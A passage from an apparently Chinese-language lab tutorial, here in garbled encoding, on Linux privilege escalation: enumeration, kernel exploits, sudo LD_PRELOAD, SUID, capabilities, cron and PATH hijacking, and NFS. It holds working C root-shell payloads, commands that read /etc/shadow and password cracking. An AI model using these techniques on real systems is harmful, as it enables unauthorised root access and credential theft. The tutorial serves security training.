é€‰é¡¹å°†æ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·çš„è¿›ç¨‹ï¼ˆaï¼‰ã€æ˜¾ç¤ºå¯åŠ¨è¿›ç¨‹çš„ç”¨æˆ·ï¼ˆuï¼‰ä»¥åŠæ˜¾ç¤ºæœªé™„åŠ åˆ°ç»ˆç«¯çš„è¿›ç¨‹ï¼ˆxï¼‰ã€‚</p><h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><p>æŸ¥çœ‹ç³»ç»Ÿç”¨æˆ·ã€‚</p><p><code>cat /etc/passwd | cut -d &quot;:&quot; -f 1</code> </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407312016606.png" alt="image-20240731201612405"></p><h3 id="ip-route"><a href="#ip-route" class="headerlink" title="ip route"></a>ip route</h3><p>æŸ¥çœ‹ç½‘ç»œè·¯ç”±</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407312019805.png" alt="image-20240731201937765"></p><h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p><code>netstat -a</code>æ˜¾ç¤ºæ‰€æœ‰ç›‘å¬ç«¯å£åŠå·²å»ºç«‹çš„è¿æ¥ã€‚</p><p><code>netstat -au æˆ– netstat -at</code> å¯ç”¨äºåˆ†åˆ«åˆ—å‡ºUDPæˆ–TCPåè®®ã€‚</p><p><code>netstat -l</code>ï¼šåˆ—å‡ºå¤„äºâ€œç›‘å¬â€æ¨¡å¼çš„ç«¯å£ã€‚</p><p><code>netstat -s</code> æŒ‰åè®®åˆ—å‡ºç½‘ç»œä½¿ç”¨æƒ…å†µç»Ÿè®¡ä¿¡æ¯ã€‚</p><p><code>netstat -tp</code> åˆ—å‡ºå¸¦æœ‰æœåŠ¡åç§°å’ŒPIDä¿¡æ¯çš„è¿æ¥ã€‚</p><p><code>netstat -i</code>ï¼šæ˜¾ç¤ºæ¥å£ç»Ÿè®¡ä¿¡æ¯ã€‚</p><p><code>netstat -ano</code> </p><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p><code>find . -name flag.txt</code> // æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹çš„flag.txtçš„æ–‡ä»¶ã€‚</p><p><code>find /home -name flag.txt</code> // æŸ¥æ‰¾homeç›®å½•ä¸‹çš„flag.txtæ–‡ä»¶ã€‚</p><p><code>find / -type d -name config</code> // åœ¨/ç›®å½•ä¸‹æŸ¥æ‰¾åä¸ºconfigçš„ç›®å½•</p><p><code>find / -type f -perm 0777</code> //æŸ¥æ‰¾å…·æœ‰ 777 æƒé™çš„æ–‡ä»¶ï¼ˆæ‰€æœ‰ç”¨æˆ·å¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œçš„æ–‡ä»¶ï¼‰</p><p><code>find / -perm a=x</code> //æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p><code>find /home -user frank</code> //æŸ¥æ‰¾homeç›®å½•ä¸‹frankç”¨æˆ·çš„æ‰€æœ‰æ–‡ä»¶ã€‚</p><p><code>find / -mtime 10</code> //æŸ¥æ‰¾è¿‡å»10å¤©å†…ä¿®æ”¹çš„æ–‡ä»¶</p><p><code>find / -atime 10</code> //æŸ¥æ‰¾è¿‡å»10å¤©å†…è®¿é—®çš„æ–‡ä»¶</p><p><code>find / -cmin 10</code> //æŸ¥æ‰¾è¿‡å»1hå†…æ›´æ”¹è¿‡çš„æ–‡ä»¶</p><p><code>find / -amin 10</code> //æŸ¥æ‰¾è¿‡å»1hå†…è®¿é—®è¿‡çš„æ–‡ä»¶</p><p><code>find / -size 50M</code> //æŸ¥æ‰¾å¤§å°ä¸º50MBçš„æ–‡ä»¶</p><p>æœ‰çš„æ—¶å€™ä½¿ç”¨findå‘½ä»¤ä¼šå‡ºç°é”™è¯¯ï¼Œè¿™ä¸ªæ—¶å€™ä½¿ç”¨<code>-type f 2&gt;dev/null</code> å°†é”™è¯¯é‡å®šå‘åˆ°/dev/nullä¸­</p><p><code>find / -writable -type d 2&gt;/dev/null</code></p><p><code>find / -perm -222 -type d 2&gt;/dev/null</code></p><p><code>find / -perm -o w -type d 2&gt;/dev/null</code></p><p>æŸ¥æ‰¾linuxä¸­æ‰€æœ‰å¯å†™çš„æ–‡ä»¶å¤¹</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code> æŸ¥æ‰¾å…·æœ‰SUIDä½çš„æ–‡ä»¶</p><h2 id="è‡ªåŠ¨æšä¸¾å·¥å…·"><a href="#è‡ªåŠ¨æšä¸¾å·¥å…·" class="headerlink" title="è‡ªåŠ¨æšä¸¾å·¥å…·"></a>è‡ªåŠ¨æšä¸¾å·¥å…·</h2><ul><li><strong>LinPeas</strong>ï¼š<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></li><li><strong>LinEnumï¼š</strong><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li><li><strong>LESï¼ˆLinuxæ¼æ´åˆ©ç”¨å»ºè®®å™¨ï¼‰ï¼š</strong><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li><li><strong>Linuxæ™ºèƒ½æšä¸¾ï¼š</strong><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li><li><strong>Linuxéšç§æ£€æŸ¥å™¨ï¼š</strong> <a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a></li></ul><p>ç”¨äºå¸®åŠ©æšä¸¾linuxçš„ç³»ç»Ÿä¿¡æ¯ï¼Œå¸®åŠ©å‘ç°æ½œåœ¨çš„æƒé™æå‡æ¼æ´ã€‚</p><h2 id="æƒé™æå‡ï¼šå†…æ ¸æ¼æ´"><a href="#æƒé™æå‡ï¼šå†…æ ¸æ¼æ´" class="headerlink" title="æƒé™æå‡ï¼šå†…æ ¸æ¼æ´"></a>æƒé™æå‡ï¼šå†…æ ¸æ¼æ´</h2><p>Linuxç³»ç»Ÿä¸Šçš„å†…æ ¸ ç®¡ç†ç³»ç»Ÿå†…å­˜å’Œåº”ç”¨ç¨‹åºç­‰ç»„ä»¶ä¹‹é—´çš„é€šä¿¡ã€‚æ­¤å…³é”®åŠŸèƒ½éœ€è¦å†…æ ¸å…·æœ‰ç‰¹å®šæƒé™ï¼›å› æ­¤ï¼ŒæˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½ä¼šè·å¾— root æƒé™ã€‚</p><h3 id="åˆ©ç”¨ï¼š"><a href="#åˆ©ç”¨ï¼š" class="headerlink" title="åˆ©ç”¨ï¼š"></a>åˆ©ç”¨ï¼š</h3><p>1.æœç´¢å†…æ ¸çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚</p><p>2.æŸ¥æ‰¾ç›®æ ‡ç‰ˆæœ¬çš„æ¼æ´ä¿¡æ¯ï¼Œè¿›ä¸€æ­¥åˆ©ç”¨ã€‚</p><h3 id="æç¤º-amp-è¯´æ˜ï¼š"><a href="#æç¤º-amp-è¯´æ˜ï¼š" class="headerlink" title="æç¤º&amp;è¯´æ˜ï¼š"></a>æç¤º&amp;è¯´æ˜ï¼š</h3><p>åœ¨å¯åŠ¨æ¼æ´ä»£ç ä¹‹å‰ï¼Œè¯·åŠ¡å¿…äº†è§£å…¶å·¥ä½œåŸç†ã€‚æŸäº›æ¼æ´ä»£ç å¯èƒ½ä¼šå¯¹æ“ä½œç³»ç»Ÿè¿›è¡Œæ›´æ”¹ï¼Œä»è€Œå¯¼è‡´å…¶åœ¨è¿›ä¸€æ­¥ä½¿ç”¨æ—¶ä¸å®‰å…¨ï¼Œæˆ–å¯¹ç³»ç»Ÿè¿›è¡Œä¸å¯é€†è½¬çš„æ›´æ”¹ï¼Œä»è€Œåœ¨ä»¥åé€ æˆé—®é¢˜ã€‚å½“ç„¶ï¼Œè¿™äº›åœ¨å®éªŒå®¤æˆ– CTF ç¯å¢ƒä¸­å¯èƒ½ä¸æ˜¯ä»€ä¹ˆå¤§é—®é¢˜ï¼Œä½†åœ¨çœŸæ­£çš„æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œè¿™äº›ç»å¯¹æ˜¯ç¦å¿Œã€‚</p><h3 id="æ¼”ç¤ºï¼š"><a href="#æ¼”ç¤ºï¼š" class="headerlink" title="æ¼”ç¤ºï¼š"></a>æ¼”ç¤ºï¼š</h3><p>sshç™»å½•è¿›å»ï¼ŒæŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬çš„ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031326248.png" alt="image-20240803132633195"></p><p>åˆ©ç”¨searchsploitè¿›è¡Œæœç´¢ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031325746.png" alt="image-20240803132549682"></p><p>å¯ä»¥å…ˆåˆ©ç”¨è¿™ä¸ªè¯•ä¸€ä¸‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031335284.png" alt="image-20240803133524204"></p><p>ææƒæˆåŠŸã€‚</p><h2 id="æƒé™æå‡ï¼šSudo"><a href="#æƒé™æå‡ï¼šSudo" class="headerlink" title="æƒé™æå‡ï¼šSudo"></a>æƒé™æå‡ï¼šSudo</h2><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œsudoå‘½ä»¤å…è®¸ä»¥rootçš„èº«ä»½è¿è¡Œç¨‹åºï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç³»ç»Ÿç®¡ç†å‘˜éœ€è¦å¯¹æ™®é€šç”¨æˆ·æä¾›æƒé™ï¼Œä¾‹å¦‚ä¸€ä¸ªæ™®é€šç”¨æˆ·ä»¥rootèº«ä»½è¿è¡Œnmapï¼Œä½†å…¶ä»–çš„åœ°æ–¹éƒ½æ˜¯æ™®é€šæƒé™ã€‚</p><h3 id="1-sudo-l"><a href="#1-sudo-l" class="headerlink" title="1.sudo -l"></a>1.sudo -l</h3><p>å¯ä»¥ä½¿ç”¨sudo -læ¥æŸ¥çœ‹å“ªäº›åœ°æ–¹ä½¿ç”¨äº†rootæƒé™ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031435102.png" alt="image-20240803143552893"></p><p><a href="https://gtfobins.github.io/%E6%98%AF%E4%B8%80%E4%B8%AA%E6%9C%89%E4%BB%B7%E5%80%BC%E7%9A%84%E8%B5%84%E6%BA%90%EF%BC%8C%E5%AE%83%E6%8F%90%E4%BE%9B%E4%BA%86%E6%9C%89%E5%85%B3%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%82%A8%E5%8F%AF%E8%83%BD%E6%8B%A5%E6%9C%89">https://gtfobins.github.io/æ˜¯ä¸€ä¸ªæœ‰ä»·å€¼çš„èµ„æºï¼Œå®ƒæä¾›äº†æœ‰å…³å¦‚ä½•ä½¿ç”¨æ‚¨å¯èƒ½æ‹¥æœ‰</a> sudo æƒé™çš„ä»»ä½•ç¨‹åºçš„ä¿¡æ¯ã€‚</p><h3 id="2-åˆ©ç”¨-LD-PRELOAD"><a href="#2-åˆ©ç”¨-LD-PRELOAD" class="headerlink" title="2.åˆ©ç”¨ LD_PRELOAD"></a>2.åˆ©ç”¨ LD_PRELOAD</h3><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šçœ‹åˆ°LD_PRELOADçš„ç¯å¢ƒé€‰é¡¹ã€‚</p><p><img src="https://i.imgur.com/gGstS69.png" alt="img"></p><p>LD_PRELOADæ˜¯ä¸€ä¸ªå…è®¸ä»»ä½•ç¨‹åºä½¿ç”¨å…±äº«åº“çš„å‡½æ•°ã€‚å¦‚æœå¯ç”¨äº†â€œenv_keepâ€é€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥ç”Ÿæˆä¸€ä¸ªå…±äº«åº“ï¼Œè¯¥åº“å°†åœ¨ç¨‹åºè¿è¡Œä¹‹å‰åŠ è½½å¹¶æ‰§è¡Œã€‚è¯·æ³¨æ„ï¼Œå¦‚æœå®é™…ç”¨æˆ· ID ä¸æœ‰æ•ˆç”¨æˆ· ID ä¸åŒï¼Œåˆ™å°†å¿½ç•¥ LD_PRELOAD é€‰é¡¹ã€‚</p><p>æ­¥éª¤å¦‚ä¸‹ï¼š<br>1.æ£€æŸ¥LD_PRELOADã€‚</p><p>2.ç¼–å†™ä¸€ä¸ªç®€å•çš„cè¯­è¨€ï¼Œç¼–è¯‘ä¸ºå…±äº«å¯¹è±¡æ–‡ä»¶(.so)ã€‚</p><p>3.ä½¿ç”¨ sudo æƒé™å’ŒæŒ‡å‘æˆ‘ä»¬çš„ .so æ–‡ä»¶çš„ LD_PRELOAD é€‰é¡¹è¿è¡Œè¯¥ç¨‹åºã€‚</p><p>ç®€å•å®ä¾‹å¦‚ä¸‹ï¼š</p><p>å‘½åä¸ºshell.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> _init() &#123;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>setgid(<span class="hljs-number">0</span>);<br>setuid(<span class="hljs-number">0</span>);<br>system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code>  // ç¼–è¯‘å…±äº«ä»£ç åº“ shell.so</p><p><code>sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</code> </p><p><img src="https://i.imgur.com/1YwARyZ.png" alt="img"></p><h2 id="æƒé™æå‡ï¼šSUID"><a href="#æƒé™æå‡ï¼šSUID" class="headerlink" title="æƒé™æå‡ï¼šSUID"></a>æƒé™æå‡ï¼šSUID</h2><p>å½“ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶è®¾ç½®äº† SUID ä½ï¼Œå¹¶ä¸”è¿™ä¸ªæ–‡ä»¶çš„æ‰€æœ‰è€…æ˜¯ rootï¼ˆè¶…çº§ç”¨æˆ·ï¼‰ï¼Œæ™®é€šç”¨æˆ·æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸´æ—¶èµ‹äºˆè¯¥ç”¨æˆ· root æƒé™æ¥æ‰§è¡Œæ–‡ä»¶ä¸­çš„ä»£ç ã€‚è¿™æ ·ï¼Œç”¨æˆ·å°±å¯ä»¥æ‰§è¡Œä¸€äº›é€šå¸¸éœ€è¦ root æƒé™çš„æ“ä½œã€‚</p><p>æŸ¥æ‰¾å…·æœ‰suidæ ‡å¿—ä½æ–‡ä»¶çš„å‘½ä»¤ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>å®ä¾‹ï¼š</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031819752.png" alt="image-20240803181904538"></p><p>ç„¶åå»æŸ¥çœ‹/etc/shadowçš„å†…å®¹ å‘ç°æ²¡æƒé™</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031820380.png" alt="image-20240803182059331"></p><p>ç„¶åå»æŸ¥ä¸€ä¸‹å…·æœ‰suidæƒé™çš„æ–‡ä»¶</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031826141.png" alt="image-20240803182603040"></p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>  åœ¨GTFOBinsä¸­å¯ä»¥æŸ¥åˆ°base64çš„suidçš„ææƒ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031827935.png" alt="image-20240803182714855"></p><p>å¯ä»¥è¿›è¡Œæ–‡ä»¶çš„è¯»å–ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031833692.png" alt="image-20240803183354514"></p><p>ç„¶ååˆ©ç”¨johnè§£ä¸€ä¸‹user2çš„å¯†ç ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031837008.png" alt="image-20240803183743929"></p><p>ç„¶åsshç™»å½•user2ç”¨æˆ·ï¼Œåœ¨homeç›®å½•ä¸‹æ‰¾åˆ°flag3.txt ä½†æ˜¯è¿™ä¸ªä»ç„¶ä¸æ˜¯rootæƒé™ï¼Œè¿˜åˆ©ç”¨ä¸Šé¢çš„base64 è¿›è¡Œè¯»å–æ–‡ä»¶ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408031840428.png" alt="image-20240803184043342"></p><h2 id="æƒé™æå‡ï¼šåŠŸèƒ½-Capabilities"><a href="#æƒé™æå‡ï¼šåŠŸèƒ½-Capabilities" class="headerlink" title="æƒé™æå‡ï¼šåŠŸèƒ½(Capabilities)"></a>æƒé™æå‡ï¼šåŠŸèƒ½(Capabilities)</h2><p>Linux capabilities å°† <strong>root æƒé™åˆ’åˆ†ä¸ºæ›´å°ã€æ›´ç‹¬ç«‹çš„å•å…ƒ</strong>ï¼Œå…è®¸è¿›ç¨‹æ‹¥æœ‰ä¸€éƒ¨åˆ†æƒé™ã€‚è¿™é€šè¿‡ä¸å¿…è¦åœ°æˆäºˆå®Œæ•´çš„ root æƒé™æ¥æœ€å°åŒ–é£é™©ã€‚</p><p>è¿™ä¸ªåœ°æ–¹ä¸è¿›è¡Œè¯¦ç»†çš„è®²è§£äº†ï¼Œå°±å¤§æ¦‚è¯´æ˜ä¸€ä¸‹æ€ä¹ˆä½¿ç”¨ï¼Œå…·ä½“å‚è€ƒï¼š<a href="https://book.hacktricks.xyz/v/cn/linux-hardening/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/v/cn/linux-hardening/privilege-escalation/linux-capabilities</a></p><p>åˆ©ç”¨getcapåˆ—å‡ºå·²å¯ç”¨çš„åŠŸèƒ½</p><p><code>getcap / -r 2&gt;/dev/null</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051030146.png" alt="image-20240805103001043"></p><p>ç„¶ååœ¨gtfobinsä¸­æŸ¥çœ‹Capabilities</p><p>è¿™ä¸ªåœ°æ–¹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨view</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051046936.png" alt="image-20240805104628853"></p><p>ä½†è¿™ä¸ªç‰ˆæœ¬å¥½åƒä¸å¤ªè¡Œï¼Œå°±æ²¡æˆåŠŸã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051049198.png" alt="image-20240805104948137"></p><h2 id="æƒé™æå‡ï¼šCron-Jobs"><a href="#æƒé™æå‡ï¼šCron-Jobs" class="headerlink" title="æƒé™æå‡ï¼šCron Jobs"></a>æƒé™æå‡ï¼šCron Jobs</h2><p>è®¡åˆ’ä»»åŠ¡ææƒåŸç†ç®€å•è¯´ä¸€ä¸‹ï¼šå¦‚æœè®¡åˆ’ä»»åŠ¡ä¸­æœ‰ä¸€ä¸ªæ˜¯ä»¥rootèº«ä»½è¿è¡Œçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹è¯¥æ–‡ä»¶çš„å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ›´æ”¹è¿™ä¸ªè®¡åˆ’ä»»åŠ¡è¦è¿è¡Œçš„è„šæœ¬å†…å®¹ï¼Œæ”¹æˆæˆ‘ä»¬æƒ³è¦å®ƒæ‰§è¡Œçš„shell,å½“å®ƒä¸‹æ¬¡æ‰§è¡Œçš„æ—¶å€™ï¼Œå°±ä¼šå˜æˆrootæƒé™ã€‚</p><p>è®¡åˆ’ä»»åŠ¡ä¸€èˆ¬å­˜æ”¾åœ¨/etc/crontab æ–‡ä»¶ä¸­</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051106453.png" alt="image-20240805110631374"></p><p>å¦‚æœæœªå®šä¹‰è„šæœ¬çš„å®Œæ•´è·¯å¾„ï¼ˆå¦‚å¯¹ backup.sh è„šæœ¬æ‰€åšçš„é‚£æ ·ï¼‰ï¼Œåˆ™ cron å°†å¼•ç”¨ /etc/crontab æ–‡ä»¶ä¸­ PATH å˜é‡ä¸‹åˆ—å‡ºçš„è·¯å¾„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åº”è¯¥èƒ½å¤Ÿåœ¨ç”¨æˆ·çš„ä¸»æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºâ€œantivirus.shâ€çš„è„šæœ¬ï¼Œå¹¶ä¸”å®ƒåº”è¯¥ç”± cron ä½œä¸šè¿è¡Œã€‚</p><p>å¯ä»¥æŸ¥çœ‹åˆ°backup.shæ–‡ä»¶çš„å†…å®¹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051114074.png" alt="image-20240805111419011"></p><p>ä¿®æ”¹æ–‡ä»¶çš„å†…å®¹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051115693.png" alt="image-20240805111531637"></p><p>è®°å¾—å¯¹backup.shåŠ ä¸Šå¯æ‰§è¡Œçš„æƒé™ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051511038.png" alt="image-20240805151116953"></p><p>æœ€åç›‘å¬ç«¯å£å³å¯å¾—åˆ°rootæƒé™ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051511128.png" alt="image-20240805151151072"></p><h2 id="æƒé™æå‡ï¼šPATH-ç¯å¢ƒå˜é‡ææƒ"><a href="#æƒé™æå‡ï¼šPATH-ç¯å¢ƒå˜é‡ææƒ" class="headerlink" title="æƒé™æå‡ï¼šPATH ç¯å¢ƒå˜é‡ææƒ"></a>æƒé™æå‡ï¼šPATH ç¯å¢ƒå˜é‡ææƒ</h2><p>linuxä¸­çš„PATHæ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå‘Šè¯‰æ“ä½œç³»ç»Ÿåœ¨å“ªé‡Œæœç´¢å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p> <img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051534615.png" alt="image-20240805153445551"></p><p>åƒæˆ‘ä»¬å¹³æ—¶æ‰§è¡Œçš„ls cat find ç­‰å‘½ä»¤å°±æ˜¯åœ¨PATHç¯å¢ƒå˜é‡ä¸­è¿›è¡ŒæŸ¥æ‰¾çš„ã€‚</p><p>åŸç†å°±æ˜¯ä¿®æ”¹$PATHå˜é‡ï¼Œå½“ç³»ç»Ÿåœ¨æ‰§è¡ŒæŸäº›å¸¸ç”¨å‘½ä»¤æ—¶ï¼Œä¼˜å…ˆè¿è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä»è€Œè¿›è¡Œä¸€ä¸ªæƒé™çš„æå‡ã€‚</p><p>ä¸‹é¢æ˜¯æ¼”ç¤ºï¼š</p><p>é¦–å…ˆæˆ‘ä»¬å…ˆå†™ä¸€ä¸ªcè¯­è¨€æ–‡ä»¶ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>setuid(<span class="hljs-number">0</span>);<br>setgid(<span class="hljs-number">0</span>);<br>system(<span class="hljs-string">&quot;thm&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å°†å…¶ç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶è®¾ç½®suidä½ã€‚ </p><p>ç„¶åæˆ‘ä»¬å¯»æ‰¾å¯å†™çš„æ–‡ä»¶å¤¹ï¼Œå°†å…¶æ·»åŠ åˆ°PATHå˜é‡ä¸­(å¦‚æœPATHå˜é‡æ²¡æœ‰çš„è¯)ï¼Œç„¶åå†å‘å¯å†™çš„æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ªthmæ–‡ä»¶ï¼Œå°†/bin/bashå†™å…¥å…¶ä¸­ï¼Œå°†å…¶èµ‹äºˆ777æƒé™ï¼Œæœ€åè¿è¡Œé‚£ä¸ªå…·æœ‰suidä½çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå³å¯ææƒæˆåŠŸã€‚</p><p>å¯»æ‰¾å¯å†™çš„æ–‡ä»¶å¤¹ï¼š</p><p><code>find / -writable 2&gt;/dev/null | cut -d &quot;/&quot; -f 2,3 | grep -v proc | sort -u</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051607893.png" alt="image-20240805160749792"></p><p>æˆ‘ä»¬å°†tmpåŠ åˆ°PATHå˜é‡é‡Œé¢ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051609757.png" alt="image-20240805160910692"></p><p>ç„¶åå‘tmpä¸‹åˆ›å»ºä¸€ä¸ªthmæ–‡ä»¶ï¼Œå¹¶èµ‹äºˆ777æƒé™ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051609998.png" alt="image-20240805160958915"></p><p>æœ€åè¿è¡Œå…·æœ‰suidä½çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051610374.png" alt="image-20240805161032325"></p><h2 id="æƒé™æå‡ï¼šNFS"><a href="#æƒé™æå‡ï¼šNFS" class="headerlink" title="æƒé™æå‡ï¼šNFS"></a>æƒé™æå‡ï¼šNFS</h2><p>æœ‰çš„æ—¶å€™ææƒï¼Œä¸ä»…ä»…å¯ä»¥é€šè¿‡ä¸Šé¢é‚£äº›æ“ä½œæ¥è¿›è¡Œï¼Œè¿˜å¯ä»¥é€šè¿‡å…±äº«æ–‡ä»¶å¤¹å’Œè¿œç¨‹ç®¡ç†æ¥å£æ¥è¿›è¡Œææƒ(ssh,telnetç­‰)ã€‚ä¾‹å¦‚ï¼šåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰¾åˆ°rootçš„sshç§é’¥,æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡sshæ¥è¿æ¥ç›®æ ‡æœåŠ¡å™¨ï¼Œä»è€Œè¾¾åˆ°rootæƒé™ã€‚</p><p>NFSï¼ˆç½‘ç»œæ–‡ä»¶å…±äº«ï¼‰é…ç½®ä¿å­˜åœ¨ /etc/exports æ–‡ä»¶ä¸­ã€‚æ­¤æ–‡ä»¶æ˜¯åœ¨ NFS æœåŠ¡å™¨å®‰è£…æœŸé—´åˆ›å»ºçš„ï¼Œé€šå¸¸å¯ç”±ç”¨æˆ·è¯»å–ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202408051632567.png" alt="image-20240805163235468"></p><p>æƒé™æå‡çš„å…³é”®å…ƒç´ æ˜¯å¦‚ä¸Šæ‰€ç¤ºçš„â€œno_root_squashâ€é€‰é¡¹ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒNFS ä¼šå°† root ç”¨æˆ·æ›´æ”¹ä¸º nfsnobodyï¼Œå¹¶å‰¥å¤ºä»»ä½•æ–‡ä»¶ä»¥ root æƒé™è¿è¡Œçš„æƒåˆ©ã€‚å¦‚æœå¯å†™å…±äº«ä¸Šå­˜åœ¨â€œno_root_squashâ€é€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªè®¾ç½®äº† SUID ä½çš„å¯æ‰§è¡Œæ–‡ä»¶å¹¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œå®ƒã€‚</p><h3 id="1-æšä¸¾ç›®æ ‡æœºå™¨ä¸Šçš„å¯æŒ‚è½½å…±äº«ã€‚"><a href="#1-æšä¸¾ç›®æ ‡æœºå™¨ä¸Šçš„å¯æŒ‚è½½å…±äº«ã€‚" 